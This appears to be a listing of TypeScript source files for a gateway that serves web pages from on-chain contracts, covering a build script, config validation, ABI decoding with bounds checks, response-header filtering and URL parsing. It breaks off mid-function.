+    52	    configPath === "" ? parsePin(raw) : parsePins(JSON.parse(await readFile(configPath, "utf8")) as unknown);
+    53	  const only: Record<string, readonly string[]> = {};
+    54	  for (const chain of Object.keys(pins.contracts)) {
+    55	    const endpointsFor = chains[chain];
+    56	    if (endpointsFor === undefined) {
+    57	      const where = configPath === "" ? `pin ${raw}` : configPath;
+    58	      throw new Error(`${where} names chain ${chain}, which the chains file does not carry`);
+    59	    }
+    60	    only[chain] = endpointsFor;
+    61	  }
+    62	  endpoints = only;
+    63	}
+    64	
+    65	async function bundle(entry: string): Promise<string> {
+    66	  const result = await build({
+    67	    entryPoints: [entry],
+    68	    bundle: true,
+    69	    minify: true,
+    70	    format: "iife",
+    71	    target: "es2022",
+    72	    write: false,
+    73	    legalComments: "none",
+    74	    define: {
+    75	      __GW44_CHAINS__: JSON.stringify(endpoints),
+    76	      __GW44_PINS__: JSON.stringify(pins),
+    77	      // A boolean the bundler can fold both ways, so each build carries one parser and not two.
+    78	      __GW44_PINNED__: String(pins !== null),
+    79	    },
+    80	  });
+    81	  const file = result.outputFiles[0];
+    82	  if (file === undefined) throw new Error(`no output for ${entry}`);
+    83	  return file.text;
+    84	}
+    85	
+    86	const [sw, boot, shell] = await Promise.all([
+    87	  bundle("src/adapters/sw/sw.ts"),
+    88	  bundle("src/adapters/sw/boot.ts"),
+    89	  readFile("src/adapters/sw/shell.html", "utf8"),
+    90	]);
+    91	const page = inlineBoot(shell, boot);
+    92	
+    93	await mkdir(out, { recursive: true });
+    94	
+    95	/* Both gates run before anything is written (#74). They used to run after, so a build that failed
+    96	   either had already overwritten `index.html` and `404.html` — and a deploy step that ignored the
+    97	   exit code shipped an oversized worker, or a directory mixing new files with stale ones. A failed
+    98	   build now leaves the output directory as it found it.
+    99	
+   100	   The size gate measures the bytes that would be written rather than the string's length in UTF-16
+   101	   units, which are equal only while the bundler emits ASCII. */
+   102	const swBytes = Buffer.byteLength(sw);
+   103	if (swBytes > SW_LIMIT) {
+   104	  throw new Error(`gw44-sw.js would be ${swBytes} B, over the ${SW_LIMIT} B limit; nothing was written`);
+   105	}
+   106	const before = (await readdir(out)).sort();
+   107	const strays = before.filter((n) => !EXPECTED.includes(n));
+   108	if (strays.length > 0) {
+   109	  throw new Error(
+   110	    `${out}/ holds ${strays.join(", ")}; the deployable is only ${EXPECTED.join(", ")}; run 'make clean'`,
+   111	  );
+   112	}
+   113	
+   114	await Promise.all([
+   115	  writeFile(`${out}/gw44-sw.js`, sw),
+   116	  writeFile(`${out}/index.html`, page),
+   117	  // GitHub Pages serves 404.html for unknown paths; S3 and CloudFront are pointed at index.html.
+   118	  writeFile(`${out}/404.html`, page),
+   119	]);
+   120	/* The hashes are printed from the files on disk rather than from the strings above: what a reader
+   121	   wants to reproduce is the artefact, and a hash of the value in memory would not catch a write
+   122	   that changed it. Sorted by name so two runs are diffable line by line. */
+   123	const names = (await readdir(out)).sort();
+   124	const lines: string[] = [];
+   125	for (const name of names) {
+   126	  const bytes = await readFile(`${out}/${name}`);
+   127	  lines.push(`${createHash("sha256").update(bytes).digest("hex")}  ${String(bytes.length).padStart(7)}  ${name}`);
+   128	}
+   129	console.log(pins === null ? `built ${out}/:` : `built ${out}/ (pinned to ${listing(pins)}):`);
+   130	for (const line of lines) console.log(`  ${line}`);
+   131	
+   132	/* Asserted after the write as well, against the bytes on disk: the gates above decided on what was
+   133	   about to be written, and this catches a write that did not produce what it was given. */
+   134	if (names.join(",") !== EXPECTED.join(",")) {
+   135	  throw new Error(`${out}/ holds ${names.join(", ")} after the write; expected ${EXPECTED.join(", ")}`);
+   136	}
+     1	// The chains file, validated once for every program that reads it (#63). The file is data a
+     2	// deployer replaces, and both of its readers compile or call its endpoints without looking: the
+     3	// build freezes them into bytes every visitor runs, and `tools/get.ts` talks to them directly.
+     4	//
+     5	// Unvalidated, the shapes the 2026-11-20 and 2026-11-21 reviews found all pass: an `http:` endpoint
+     6	// on a public host, a bare string where an array belongs (`supports()` is true and the "list" is
+     7	// iterated one character at a time), `null` (which the pinned build's `!== undefined` check accepts)
+     8	// and a `__proto__` key. The last is an own property everywhere on the path from file to bundle —
+     9	// `JSON.parse` keeps it as one and esbuild emits it computed, measured both ways — so the key check
+    10	// below is what rejects it, not a prototype guard.
+    11	import type { Chains } from "../src/adapters/rpc/fetch.ts";
+    12	import { isChainId, isLoopback } from "../src/core/target.ts";
+    13	
+    14	function fail(what: string): never {
+    15	  throw new Error(`the chains file ${what}`);
+    16	}
+    17	
+    18	/** What a value is, for a message a deployer can act on: `typeof null` is "object", which names
+    19	 *  the wrong mistake at the one place a chains file is most likely to make it. */
+    20	function kindOf(value: unknown): string {
+    21	  if (value === null) return "null";
+    22	  if (Array.isArray(value)) return "a list";
+    23	  return `a ${typeof value}`;
+    24	}
+    25	
+    26	/**
+    27	 * The chains file as `Chains`, or an error naming what is wrong and where. The accepted shape is an
+    28	 * object whose keys are decimal chain ids and whose values are non-empty arrays of `https:` URLs,
+    29	 * with `http:` for loopback hosts only, and nothing else: no other key, no other value, no empty
+    30	 * list. An empty object is accepted — a gateway configured with no chain serves nothing, which is
+    31	 * a deployment choice and not a malformed file.
+    32	 */
+    33	export function parseChains(value: unknown): Chains {
+    34	  if (typeof value !== "object" || value === null || Array.isArray(value)) {
+    35	    fail("is not an object of chain id to endpoints");
+    36	  }
+    37	  const out: Record<string, readonly string[]> = Object.create(null) as Record<string, readonly string[]>;
+    38	  for (const [chain, endpoints] of Object.entries(value)) {
+    39	    if (!isChainId(chain)) fail(`has ${JSON.stringify(chain)} as a key, which is not a chain id`);
+    40	    if (!Array.isArray(endpoints)) fail(`gives chain ${chain} ${kindOf(endpoints)} instead of a list`);
+    41	    if (endpoints.length === 0) fail(`gives chain ${chain} an empty list of endpoints`);
+    42	    for (const endpoint of endpoints as unknown[]) {
+    43	      if (typeof endpoint !== "string") fail(`has ${kindOf(endpoint)} among chain ${chain}'s endpoints`);
+    44	      let url: URL;
+    45	      try {
+    46	        url = new URL(endpoint);
+    47	      } catch {
+    48	        fail(`has ${JSON.stringify(endpoint)} on chain ${chain}, which is not a URL`);
+    49	      }
+    50	      const ok = url.protocol === "https:" || (url.protocol === "http:" && isLoopback(url.hostname));
+    51	      if (!ok) {
+    52	        fail(`has ${JSON.stringify(endpoint)} on chain ${chain}: endpoints are https, or http on loopback`);
+    53	      }
+    54	    }
+    55	    out[chain] = endpoints as readonly string[];
+    56	  }
+    57	  return out;
+    58	}
+    59	
+    60	/** The file at `path`, parsed and validated, with the path in anything thrown. */
+    61	export async function readChains(path: string, read: (p: string) => Promise<string>): Promise<Chains> {
+    62	  let value: unknown;
+    63	  try {
+    64	    value = JSON.parse(await read(path)) as unknown;
+    65	  } catch (error) {
+    66	    throw new Error(`${path}: ${error instanceof Error ? error.message : String(error)}`);
+    67	  }
+    68	  try {
+    69	    return parseChains(value);
+    70	  } catch (error) {
+    71	    throw new Error(`${path}: ${error instanceof Error ? error.message : String(error)}`);
+    72	  }
+    73	}
+     1	/**
+     2	 * Puts the boot bundle inside the shell's `<script>` element.
+     3	 *
+     4	 * Its own module so it can be unit-tested: `tools/build.ts` reads files and writes a deployable at
+     5	 * module load, so a test cannot import it without running a build.
+     6	 *
+     7	 * Two sequences end a script element, and the escape used to handle one of them case-sensitively
+     8	 * (#58, and the 2026-11-21 review's F6):
+     9	 *
+    10	 * - `</script`, in any case. HTML tag matching is case-insensitive, so `</SCRIPT` closed the element
+    11	 *   just as well and the rest of the bundle became document text.
+    12	 * - `<!--`, which opens a comment inside a script element and makes the parser treat the remainder
+    13	 *   up to `-->` as commented-out, so a bundle containing it would silently stop executing part-way.
+    14	 *
+    15	 * Both are escaped with a backslash, which JavaScript ignores before `/` and `!` but which stops the
+    16	 * HTML parser recognising the sequence.
+    17	 *
+    18	 * The replacement keeps the matched text (`$1`) rather than writing a fixed string. A fixed one
+    19	 * would lower-case the bundle's own characters — `</SCRIPT` became `<\/script` — which rewrites a
+    20	 * string literal inside the program being inlined. Caught by this module's own test.
+    21	 */
+    22	export function inlineBoot(shell: string, boot: string): string {
+    23	  const safe = boot.replace(/<(\/script)/gi, "<\\$1").replaceAll("<!--", "<\\!--");
+    24	  // A function replacement: a string one would expand `$&` and friends found in the minified script.
+    25	  return shell.replace("/*@boot@*/", () => safe);
+    26	}
+    27	
+    28	/** True when nothing in this text can end or comment out the script element it is placed in. */
+    29	export function isScriptSafe(text: string): boolean {
+    30	  return !/<\/script/i.test(text) && !text.includes("<!--");
+    31	}
+
+ succeeded in 0ms:
+     1	import { GatewayError } from "./errors.ts";
+     2	
+     3	/** `bytes4(keccak256("html()"))`, ERC-8244. */
+     4	export const HTML_SELECTOR = "0x33c34ac3";
+     5	/** `bytes4(keccak256("request(string[],(string,string)[])"))`, ERC-5219. */
+     6	export const REQUEST_SELECTOR = "0x1374c460";
+     7	
+     8	const WORD = 32;
+     9	const MAX_HEADERS = 64;
+    10	/**
+    11	 * Total bytes of key and value text one response's headers may carry. The count cap alone bounded
+    12	 * how many headers were read and not how much they decoded to: every pair's key and value offset is
+    13	 * checked against the data's bounds only, so all 128 of them may name one string and a capped
+    14	 * response decodes to many times its size (F3, the 2026-11-20 review).
+    15	 *
+    16	 * Chosen rather than measured, at about four times a long content security policy. The live fixture
+    17	 * returns 49 bytes of header text at most, measured on both testnets at this commit.
+    18	 */
+    19	const MAX_HEADER_BYTES = 16_384;
+    20	const utf8 = new TextEncoder();
+    21	
+    22	/**
+    23	 * Validated in the conversion loop rather than by a regular expression. `/^0x([0-9a-fA-F]{2})*$/`
+    24	 * backtracks once per byte and threw `RangeError: Maximum call stack size exceeded` above about
+    25	 * 4 MiB — inside the response size cap, so a large document failed at every endpoint in turn and was
+    26	 * served as a 502 that blamed the endpoints (F4, the 2026-11-20 review). One pass, no recursion, and
+    27	 * the first character that is not a hex digit throws `bad-response`.
+    28	 */
+    29	function notHex(): never {
+    30	  throw new GatewayError("bad-response", "result is not hex");
+    31	}
+    32	
+    33	function nibble(code: number): number {
+    34	  if (code >= 0x30 && code <= 0x39) return code - 0x30;
+    35	  if (code >= 0x61 && code <= 0x66) return code - 0x57;
+    36	  if (code >= 0x41 && code <= 0x46) return code - 0x37;
+    37	  return -1;
+    38	}
+    39	
+    40	export function hexToBytes(hex: string): Uint8Array {
+    41	  if (hex.length < 2 || hex.charCodeAt(0) !== 0x30 || hex.charCodeAt(1) !== 0x78 || hex.length % 2 !== 0) notHex();
+    42	  const out = new Uint8Array((hex.length - 2) / 2);
+    43	  for (let i = 0; i < out.length; i++) {
+    44	    const hi = nibble(hex.charCodeAt(2 + i * 2));
+    45	    const lo = nibble(hex.charCodeAt(3 + i * 2));
+    46	    if (hi < 0 || lo < 0) notHex();
+    47	    out[i] = (hi << 4) | lo;
+    48	  }
+    49	  return out;
+    50	}
+    51	
+    52	export function bytesToHex(bytes: Uint8Array): string {
+    53	  let out = "0x";
+    54	  for (const b of bytes) out += b.toString(16).padStart(2, "0");
+    55	  return out;
+    56	}
+    57	
+    58	function word(n: number): Uint8Array {
+    59	  const out = new Uint8Array(WORD);
+    60	  new DataView(out.buffer).setUint32(WORD - 4, n);
+    61	  return out;
+    62	}
+    63	
+    64	function concat(parts: Uint8Array[]): Uint8Array {
+    65	  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
+    66	  let at = 0;
+    67	  for (const p of parts) {
+    68	    out.set(p, at);
+    69	    at += p.length;
+    70	  }
+    71	  return out;
+    72	}
+    73	
+    74	function encodeString(s: string): Uint8Array {
+    75	  const data = utf8.encode(s);
+    76	  const padded = new Uint8Array(Math.ceil(data.length / WORD) * WORD);
+    77	  padded.set(data);
+    78	  return concat([word(data.length), padded]);
+    79	}
+    80	
+    81	/** A dynamic array of dynamic items: length, one offset per item, then the items. */
+    82	function encodeArray(items: Uint8Array[]): Uint8Array {
+    83	  const offsets: Uint8Array[] = [];
+    84	  let at = items.length * WORD;
+    85	  for (const item of items) {
+    86	    offsets.push(word(at));
+    87	    at += item.length;
+    88	  }
+    89	  return concat([word(items.length), ...offsets, ...items]);
+    90	}
+    91	
+    92	function encodePair([key, value]: [string, string]): Uint8Array {
+    93	  const k = encodeString(key);
+    94	  return concat([word(2 * WORD), word(2 * WORD + k.length), k, encodeString(value)]);
+    95	}
+    96	
+    97	/** Calldata for ERC-5219 `request(string[] resource, KeyValue[] params)`. */
+    98	export function encodeRequest(resource: string[], params: [string, string][]): string {
+    99	  const r = encodeArray(resource.map(encodeString));
+   100	  const p = encodeArray(params.map(encodePair));
+   101	  return REQUEST_SELECTOR + bytesToHex(concat([word(2 * WORD), word(2 * WORD + r.length), r, p])).slice(2);
+   102	}
+   103	
+   104	/**
+   105	 * Reads ABI words out of bytes a contract chose. Every offset and length is attacker-controlled,
+   106	 * so each read is bounds-checked against the buffer and nothing is allocated from a claimed size.
+   107	 */
+   108	function uint(data: Uint8Array, at: number): number {
+   109	  if (!Number.isSafeInteger(at) || at < 0 || at + WORD > data.length) {
+   110	    throw new GatewayError("bad-response", "return data is truncated");
+   111	  }
+   112	  for (let i = at; i < at + WORD - 6; i++) {
+   113	    if (data[i] !== 0) throw new GatewayError("bad-response", "return data has an out-of-range word");
+   114	  }
+   115	  let n = 0;
+   116	  for (let i = at + WORD - 6; i < at + WORD; i++) n = n * 256 + (data[i] ?? 0);
+   117	  return n;
+   118	}
+   119	
+   120	function bytesAt(data: Uint8Array, at: number): Uint8Array {
+   121	  const length = uint(data, at);
+   122	  const start = at + WORD;
+   123	  if (start + length > data.length) throw new GatewayError("bad-response", "return data is truncated");
+   124	  return data.subarray(start, start + length);
+   125	}
+   126	
+   127	/** Return data of `html()`: one ABI `string`, handed back as its raw bytes. */
+   128	export function decodeString(data: Uint8Array): Uint8Array {
+   129	  return bytesAt(data, uint(data, 0));
+   130	}
+   131	
+   132	export interface RequestResult {
+   133	  status: number;
+   134	  body: Uint8Array;
+   135	  headers: [string, string][];
+   136	}
+   137	
+   138	/** Return data of ERC-5219 `request()`: `(uint16 statusCode, string body, KeyValue[] headers)`. */
+   139	export function decodeRequestResult(data: Uint8Array): RequestResult {
+   140	  const status = uint(data, 0);
+   141	  const body = bytesAt(data, uint(data, WORD));
+   142	  const list = uint(data, 2 * WORD);
+   143	  const count = uint(data, list);
+   144	  if (count > MAX_HEADERS) throw new GatewayError("bad-response", "too many headers");
+   145	  const base = list + WORD;
+   146	  const text = new TextDecoder("utf-8", { fatal: true });
+   147	  const headers: [string, string][] = [];
+   148	  let headerBytes = 0;
+   149	  try {
+   150	    for (let i = 0; i < count; i++) {
+   151	      const pair = base + uint(data, base + i * WORD);
+   152	      const key = bytesAt(data, pair + uint(data, pair));
+   153	      const value = bytesAt(data, pair + uint(data, pair + WORD));
+   154	      /* Summed and checked before either is decoded: decoding is where the bytes are copied, so a
+   155	         bound applied afterwards would already have paid for the allocation it exists to refuse. */
+   156	      headerBytes += key.length + value.length;
+   157	      if (headerBytes > MAX_HEADER_BYTES) {
+   158	        throw new GatewayError("bad-response", `header text exceeds ${MAX_HEADER_BYTES} bytes`);
+   159	      }
+   160	      headers.push([text.decode(key), text.decode(value)]);
+   161	    }
+   162	  } catch (e) {
+   163	    if (e instanceof GatewayError) throw e;
+   164	    throw new GatewayError("bad-response", "header is not UTF-8");
+   165	  }
+   166	  return { status, body, headers };
+   167	}
+     1	/** Every failure the gateway can describe to a client; anything else is a bug. */
+     2	export type GatewayErrorKind =
+     3	  | "bad-target" // the URL names no contract
+     4	  | "unknown-chain" // no RPC endpoint is configured for the chain
+     5	  | "not-found" // the contract answered, and the answer is "no such resource"
+     6	  | "bad-response" // the contract or the RPC returned bytes that do not decode
+     7	  | "upstream"; // no configured RPC endpoint produced an answer
+     8	
+     9	const STATUS: Record<GatewayErrorKind, number> = {
+    10	  "bad-target": 400,
+    11	  "unknown-chain": 404,
+    12	  "not-found": 404,
+    13	  "bad-response": 502,
+    14	  upstream: 502,
+    15	};
+    16	
+    17	export class GatewayError extends Error {
+    18	  readonly kind: GatewayErrorKind;
+    19	
+    20	  constructor(kind: GatewayErrorKind, message: string) {
+    21	    super(message);
+    22	    this.name = "GatewayError";
+    23	    this.kind = kind;
+    24	  }
+    25	
+    26	  get status(): number {
+    27	    return STATUS[this.kind];
+    28	  }
+    29	}
+     1	/** One JSON-RPC `eth_call` against `latest`. The only I/O the core performs. */
+     2	export interface Rpc {
+     3	  /** False when no endpoint is configured for `chain`; `call` would throw `unknown-chain`. */
+     4	  supports(chain: string): boolean;
+     5	  /**
+     6	   * Returns the call's return data. Throws `RpcRevert` when the EVM reverted, which is an
+     7	   * answer, and `GatewayError("upstream")` when no endpoint produced one, which is not.
+     8	   */
+     9	  call(chain: string, to: string, data: string): Promise<Uint8Array>;
+    10	}
+    11	
+    12	export class RpcRevert extends Error {
+    13	  constructor(message = "execution reverted") {
+    14	    super(message);
+    15	    this.name = "RpcRevert";
+    16	  }
+    17	}
+    18	
+    19	export interface GatewayResponse {
+    20	  status: number;
+    21	  headers: [string, string][];
+    22	  body: Uint8Array;
+    23	}
+     1	import { HTML_SELECTOR, decodeRequestResult, decodeString, encodeRequest } from "./abi.ts";
+     2	import { GatewayError } from "./errors.ts";
+     3	import { type GatewayResponse, type Rpc, RpcRevert } from "./ports.ts";
+     4	import type { Frame, Target } from "./target.ts";
+     5	
+     6	/**
+     7	 * Headers a contract may set on its own response. An allowlist, because the same core runs behind
+     8	 * adapters where a contract-chosen `Set-Cookie` or `Clear-Site-Data` would reach past its origin.
+     9	 */
+    10	const PASSED_HEADERS = new Set([
+    11	  "content-type",
+    12	  "content-language",
+    13	  "content-disposition",
+    14	  "content-security-policy",
+    15	  "referrer-policy",
+    16	  "permissions-policy",
+    17	  "cross-origin-opener-policy",
+    18	  "cross-origin-embedder-policy",
+    19	  "cross-origin-resource-policy",
+    20	  "access-control-allow-origin",
+    21	  "x-frame-options",
+    22	]);
+    23	
+    24	/** Never cached below the client, and never sniffed into a type the contract did not declare. */
+    25	const FIXED_HEADERS: [string, string][] = [
+    26	  ["cache-control", "no-store"],
+    27	  ["x-content-type-options", "nosniff"],
+    28	];
+    29	
+    30	const HEADER_VALUE = /^[\t\x20-\x7e]*$/;
+    31	
+    32	/**
+    33	 * The framing rule a root document is served with unless the build says `"any"` (#57).
+    34	 *
+    35	 * `html()` returns bytes and no headers, so a root document had no framing rule at all and any site
+    36	 * could put a contract's page in a frame and read the visitor's clicks against it. The gateway
+    37	 * supplies the rule the document cannot: same-origin framing only, which for a gateway origin means
+    38	 * the contract's own pages.
+    39	 */
+    40	export const ROOT_FRAME_POLICY = "frame-ancestors 'self'";
+    41	
+    42	function respond(status: number, type: string, body: Uint8Array, extra: [string, string][] = []): GatewayResponse {
+    43	  return { status, headers: [["content-type", type], ...extra, ...FIXED_HEADERS], body };
+    44	}
+    45	
+    46	/** Plain text, always: an error body never carries markup built from a URL or a contract. */
+    47	export function errorResponse(error: unknown): GatewayResponse {
+    48	  const known = error instanceof GatewayError ? error : new GatewayError("upstream", "internal gateway error");
+    49	  const body = new TextEncoder().encode(`gw44: ${known.message}\n`);
+    50	  return respond(known.status, "text/plain; charset=utf-8", body);
+    51	}
+    52	
+    53	/** An address with no code, or a fallback that returns nothing, answers a call with zero bytes. */
+    54	async function call(target: Target, rpc: Rpc, data: string): Promise<Uint8Array> {
+    55	  const out = await rpc.call(target.chain, target.address, data);
+    56	  if (out.length === 0) throw new GatewayError("not-found", "the address does not serve this resource");
+    57	  return out;
+    58	}
+    59	
+    60	async function html(target: Target, rpc: Rpc, frame: Frame): Promise<GatewayResponse> {
+    61	  const body = decodeString(await call(target, rpc, HTML_SELECTOR));
+    62	  if (body.length === 0) throw new GatewayError("not-found", "html() returned an empty document");
+    63	  const framing: [string, string][] = frame === "any" ? [] : [["content-security-policy", ROOT_FRAME_POLICY]];
+    64	  return respond(200, "text/html; charset=utf-8", body, framing);
+    65	}
+    66	
+    67	async function request(target: Target, rpc: Rpc): Promise<GatewayResponse> {
+    68	  const data = await call(target, rpc, encodeRequest(target.resource, target.params));
+    69	  const result = decodeRequestResult(data);
+    70	  // The range a `Response` can be built with; 1xx and 3xx-without-Location are not documents.
+    71	  if (result.status < 200 || result.status > 599) {
+    72	    throw new GatewayError("bad-response", `contract returned status ${result.status}`);
+    73	  }
+    74	  let type = "application/octet-stream";
+    75	  const extra: [string, string][] = [];
+    76	  for (const [rawKey, value] of result.headers) {
+    77	    const key = rawKey.toLowerCase();
+    78	    // A synthesized response is not content-decoded by the browser; garbage is worse than a 502.
+    79	    if (key === "content-encoding" && value.toLowerCase() !== "identity") {
+    80	      throw new GatewayError("bad-response", `content-encoding ${value} is not supported`);
+    81	    }
+    82	    if (!PASSED_HEADERS.has(key) || !HEADER_VALUE.test(value)) continue;
+    83	    if (key === "content-type") type = value;
+    84	    else extra.push([key, value]);
+    85	  }
+    86	  const nullBody = result.status === 204 || result.status === 205 || result.status === 304;
+    87	  return respond(result.status, type, nullBody ? new Uint8Array() : result.body, extra);
+    88	}
+    89	
+    90	/**
+    91	 * The whole gateway: the root is ERC-8244 `html()`, every other path is ERC-5219 `request()`.
+    92	 * Never throws; a failure is a response.
+    93	 *
+    94	 * `frame` is the build's framing setting and applies to a root document only: a sub-path's headers
+    95	 * are the contract's, within `PASSED_HEADERS`, and a contract that wants a policy there sets one.
+    96	 */
+    97	export async function resolve(target: Target, rpc: Rpc, frame: Frame = "self"): Promise<GatewayResponse> {
+    98	  try {
+    99	    if (!rpc.supports(target.chain)) {
+   100	      throw new GatewayError("unknown-chain", `chain ${target.chain} is not configured on this gateway`);
+   101	    }
+   102	    return await (target.resource.length === 0 ? html(target, rpc, frame) : request(target, rpc));
+   103	  } catch (error) {
+   104	    if (error instanceof RpcRevert) {
+   105	      return errorResponse(new GatewayError("not-found", "the contract does not serve this resource"));
+   106	    }
+   107	    return errorResponse(error);
+   108	  }
+   109	}
+     1	import { GatewayError } from "./errors.ts";
+     2	
+     3	export interface Target {
+     4	  /** Decimal chain id, no leading zeros. */
+     5	  chain: string;
+     6	  /** Lower-case, 0x-prefixed, 20 bytes. */
+     7	  address: string;
+     8	  /** Percent-decoded path segments. Empty for the root. */
+     9	  resource: string[];
+    10	  params: [string, string][];
+    11	  /**
+    12	   * Set when a path-form URL lacks the slash after the address. Relative URLs in the document
+    13	   * would resolve one level too high, so the adapter redirects here instead of serving.
+    14	   */
+    15	  redirect?: string;
+    16	  /** How to answer `redirect`; 308 when absent. 302 is for a redirect whose destination can change. */
+    17	  redirectStatus?: 302 | 308;
+    18	}
+    19	
+    20	/**
+    21	 * One project's contracts, one per chain, as `gw44.json` names them. Several chains of one project
+    22	 * share one origin and are told apart by the first path segment, which is a path and not a browser
+    23	 * boundary: they share storage, the worker registration and any wallet permission the visitor has
+    24	 * granted, so each is only as safe as the weakest contract configured beside it. An application
+    25	 * that keeps per-chain state separates it by chain itself; nothing in the origin does that for it.
+    26	 * What the prefix buys is that a document's absolute URL fails instead of reading another chain's
+    27	 * contract, and that one project's contracts stay out of every other project's origin (decision 9;
+    28	 * F1 of the 2026-11-20 review, which found this comment claiming the opposite).
+    29	 */
+    30	export interface Pins {
+    31	  /** A key of `contracts`; the chain `/` goes to. */
+    32	  default: string;
+    33	  /** Chain id to lower-case address. At least one. */
+    34	  contracts: Record<string, string>;
+    35	  /** Who may frame a root document; `"self"` when absent. See `Frame`. */
+    36	  frame?: Frame;
+    37	}
+    38	
+    39	/**
+    40	 * Who may frame a contract's root document. `"self"` — the default, and what a `PIN=` build takes —
+    41	 * serves it with `content-security-policy: frame-ancestors 'self'`; `"any"` omits the header and
+    42	 * lets any site frame it. The whole setting is those two words: a project that needs a policy of its
+    43	 * own serves its page from `request()`, where it sets its own headers (#57).
+    44	 */
+    45	export type Frame = "self" | "any";
+    46	
+    47	const ADDRESS = /^0x[0-9a-f]{40}$/;
+    48	const CHAIN = /^[1-9][0-9]{0,15}$/;
+    49	
+    50	/** A decimal chain id: no leading zeros, no sign, no separators. The URL form's rule, exported so
+    51	 *  the chains file is checked against the same one rather than a second copy of it. */
+    52	export function isChainId(value: string): boolean {
+    53	  return CHAIN.test(value);
+    54	}
+    55	
+    56	/** Loopback only: `localhost`, any `*.localhost`, 127.0.0.0/8 and `[::1]`. */
+    57	export function isLoopback(hostname: string): boolean {
+    58	  return (
+    59	    hostname === "localhost" ||
+    60	    hostname.endsWith(".localhost") ||
+    61	    hostname === "[::1]" ||
+    62	    /^127(\.[0-9]{1,3}){3}$/.test(hostname)
+    63	  );
+    64	}
+    65	
+    66	function segments(pathname: string): string[] {
+    67	  const parts = pathname.split("/").slice(1);
+    68	  try {
+    69	    return parts.map((p) => decodeURIComponent(p));
+    70	  } catch {
+    71	    throw new GatewayError("bad-target", "malformed percent-encoding in path");
+    72	  }
+    73	}
+    74	
+    75	/**
+    76	 * Two URL forms, and nothing else:
+    77	 *
+    78	 *   host form  `<address>.<chain>.<any base>/<path>`   every contract its own origin
+    79	 *   path form  `<loopback>/<chain>/<address>/<path>`   every contract on one origin
+    80	 *
+    81	 * The path form is honoured on loopback hosts only. On a public host it would put every contract
+    82	 * in one origin, where any document could read another's storage or replace its service worker.
+    83	 *
+    84	 * Returns null when the URL names no contract, so the adapter can leave it to the static host.
+    85	 */
+    86	export function parseTarget(url: URL): Target | null {
+    87	  const labels = url.hostname.toLowerCase().split(".");
+    88	  const params: [string, string][] = [...url.searchParams.entries()];
+    89	
+    90	  const [first, second] = labels;
+    91	  if (labels.length >= 3 && first !== undefined && second !== undefined && ADDRESS.test(first)) {
+    92	    if (!CHAIN.test(second)) return null;
+    93	    const resource = segments(url.pathname);
+    94	    return { chain: second, address: first, resource: trimRoot(resource), params };
+    95	  }
+    96	
+    97	  if (!isLoopback(url.hostname.toLowerCase())) return null;
+    98	  const [chain, rawAddress, ...rest] = segments(url.pathname);
+    99	  const address = rawAddress?.toLowerCase();
+   100	  if (chain === undefined || address === undefined) return null;
+   101	  if (!CHAIN.test(chain) || !ADDRESS.test(address)) return null;
+   102	  const target: Target = { chain, address, resource: trimRoot(rest), params };
+   103	  if (rest.length === 0) target.redirect = `${url.pathname}/${url.search}`;
+   104	  return target;
+   105	}
+   106	
+   107	/**
+   108	 * `<chain>:<address>`, the pin as a build gives it. Throws rather than returning null: a URL that
+   109	 * names no contract is ordinary and a malformed pin is a mistake, so the two must not look alike.
+   110	 */
+   111	export function parsePin(text: string): Pins {
+   112	  const parts = text.split(":");
+   113	  const [chain, rawAddress] = parts;
+   114	  if (parts.length !== 2 || chain === undefined || rawAddress === undefined) {
+   115	    throw new GatewayError("bad-target", `pin must be <chain>:<address>; got ${JSON.stringify(text)}`);
+   116	  }
+   117	  const address = rawAddress.toLowerCase();
+   118	  if (!CHAIN.test(chain)) {
+   119	    throw new GatewayError("bad-target", `pin chain must be a decimal chain id; got ${JSON.stringify(chain)}`);
+   120	  }
+   121	  if (!ADDRESS.test(address)) {
+   122	    throw new GatewayError("bad-target", `pin address must be 0x and 40 hex digits; got ${JSON.stringify(rawAddress)}`);
+   123	  }
+   124	  return { default: chain, contracts: { [chain]: address } };
+   125	}
+   126	
+   127	/**
+   128	 * The configuration file, validated. Throws rather than returning null for the same reason
+   129	 * `parsePin` does: a malformed configuration is a mistake, not a URL that names no contract.
+   130	 */
+   131	export function parsePins(value: unknown): Pins {
+   132	  if (typeof value !== "object" || value === null || Array.isArray(value)) {
+   133	    throw new GatewayError("bad-target", `configuration must be a JSON object; got ${describe(value)}`);
+   134	  }
+   135	  const record = value as Record<string, unknown>;
+   136	  for (const key of Object.keys(record)) {
+   137	    if (key !== "default" && key !== "contracts" && key !== "frame") {
+   138	      throw new GatewayError("bad-target", `configuration has no key ${JSON.stringify(key)}`);
+   139	    }
+   140	  }
+   141	  const frame = record["frame"];
+   142	  if (frame !== undefined && frame !== "self" && frame !== "any") {
+   143	    throw new GatewayError("bad-target", `configuration "frame" must be "self" or "any"; got ${describe(frame)}`);
+   144	  }
+   145	  const raw = record["contracts"];
+   146	  if (typeof raw !== "object" || raw === null || Array.isArray(raw)) {
+   147	    throw new GatewayError("bad-target", `configuration "contracts" must be an object; got ${describe(raw)}`);
+   148	  }
+   149	  const contracts: Record<string, string> = {};
+   150	  for (const [chain, address] of Object.entries(raw as Record<string, unknown>)) {
+   151	    if (!CHAIN.test(chain)) {
+   152	      throw new GatewayError("bad-target", `configuration chain ${JSON.stringify(chain)} is not a decimal chain id`);
+   153	    }
+   154	    if (typeof address !== "string" || !ADDRESS.test(address.toLowerCase())) {
+   155	      throw new GatewayError(
+   156	        "bad-target",
+   157	        `configuration address for chain ${chain} must be 0x and 40 hex digits; got ${describe(address)}`,
+   158	      );
+   159	    }
+   160	    contracts[chain] = address.toLowerCase();
+   161	  }
+   162	  const chains = Object.keys(contracts);
+   163	  const only = chains[0];
+   164	  if (only === undefined) {
+   165	    throw new GatewayError("bad-target", 'configuration "contracts" must name at least one chain');
+   166	  }
+   167	  /* The default may be left out only when there is nothing to choose between. With two contracts a
+   168	     missing default would make `/` mean whichever chain the JSON happened to list first. */
+   169	  const fallback = record["default"] ?? (chains.length === 1 ? only : undefined);
+   170	  if (fallback === undefined) {
+   171	    throw new GatewayError("bad-target", `configuration needs "default" when it names ${chains.length} chains`);
+   172	  }
+   173	  if (typeof fallback !== "string" || !Object.hasOwn(contracts, fallback)) {
+   174	    throw new GatewayError(
+   175	      "bad-target",
+   176	      `configuration "default" must be one of ${chains.join(", ")}; got ${describe(fallback)}`,
+   177	    );
+   178	  }
+   179	  // Absent rather than defaulted here, so one place decides what absent means: `frameOf`.
+   180	  return frame === undefined ? { default: fallback, contracts } : { default: fallback, contracts, frame };
+   181	}
+   182	
+   183	function describe(value: unknown): string {
